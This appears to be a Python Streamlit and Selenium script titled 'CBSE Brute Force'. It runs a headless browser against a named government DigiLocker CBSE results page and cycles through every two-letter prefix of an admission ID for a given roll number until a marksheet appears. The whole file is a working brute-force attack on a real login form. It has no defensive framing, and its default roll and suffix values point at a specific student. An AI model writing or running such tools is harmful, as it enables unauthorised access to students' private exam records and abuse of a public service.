import streamlit as st
import os, time, string
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ========================= CONFIGURATION =========================
URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

def get_driver():
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1024,768")
    
    render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
    if os.path.exists(render_bin):
        options.binary_location = render_bin
    
    return webdriver.Chrome(options=options)

def check_for_success(driver):
    try:
        page_source = driver.page_source.lower()
        success_keys = ["marks", "statement", "subject", "total", "grade", "pass"]
        if any(key in page_source for key in success_keys):
            return True, "Success Keywords Detected"

        if len(driver.find_elements(By.ID, "rroll")) == 0:
            return True, "Redirected: Login inputs disappeared"
            
        err_msg = driver.find_elements(By.ID, "err_msg")
        if err_msg and err_msg[0].is_displayed():
            if "no data" in err_msg[0].text.lower():
                return False, "Fail: No data found"
    except:
        pass
    return False, "Still on Login Page"

# ========================= UI =========================
st.set_page_config(page_title="Deep Debugger", layout="wide")
st.title("🔬 CBSE Brute Force: Deep Logging")

col1, col2 = st.columns([1, 2])
with col1:
    roll_val = st.text_input("Roll Number", "18615899")
    suffix_val = st.text_input("Suffix", "994511")
    delay = st.slider("Wait Time (sec)", 0.5, 5.0, 2.0)
    start_btn = st.button("🚀 Run with Logging")

with col2:
    st.subheader("System Logs & Live View")
    log_window = st.container(border=True)
    debug_image = st.empty()
    debug_text = st.empty()

if start_btn:
    driver = None
    try:
        log_window.write("⏳ [1/4] Starting Driver...")
        driver = get_driver()
        
        letters = string.ascii_uppercase
        combos = [f"{a}{b}" for a in letters for b in letters]
        
        log_window.write(f"⚡ [2/4] Starting Loop...")
        
        for i, prefix in enumerate(combos):
            full_id = f"{prefix}{suffix_val}"
            debug_text.info(f"Currently Testing: **{full_id}**")
            
            # Action 1: Load Page
            driver.get(URL)
            
            try:
                # Action 2: SMART WAIT for the form (Max 10 seconds)
                wait = WebDriverWait(driver, 10)
                roll_in = wait.until(EC.presence_of_element_located((By.ID, "rroll")))
                admn_in = driver.find_element(By.ID, "admn_id")
                sub_btn = driver.find_element(By.ID, "submit")
                
                # Action 3: Fill and Click
                roll_in.send_keys(roll_val)
                admn_in.send_keys(full_id)
                sub_btn.click()
                
                # Action 4: Wait and Observe
                time.sleep(delay)
                
                # Update visual debug
                screenshot = driver.get_screenshot_as_png()
                debug_image.image(screenshot, caption=f"View: {full_id}")
                
                is_hit, reason = check_for_success(driver)
                
                if is_hit:
                    log_window.success(f"💎 [MATCH FOUND]: {full_id} ({reason})")
                    st.balloons()
                    break
                else:
                    if i % 5 == 0:
                        log_window.write(f"ℹ️ Attempt {i+1}: {full_id} -> Fail")
            
            except Exception as loop_err:
                # If it fails to find the box, show us what it sees!
                scr = driver.get_screenshot_as_png()
                debug_image.image(scr, caption=f"ERROR VIEW: {full_id}")
                log_window.error(f"❌ Form not found at {full_id}. See screenshot.")
                continue

    except Exception as e:
        st.error(f"🔥 CRITICAL CRASH: {e}")
    finally:
        if driver:
            log_window.write("🧹 Closing browser...")
            driver.quit()
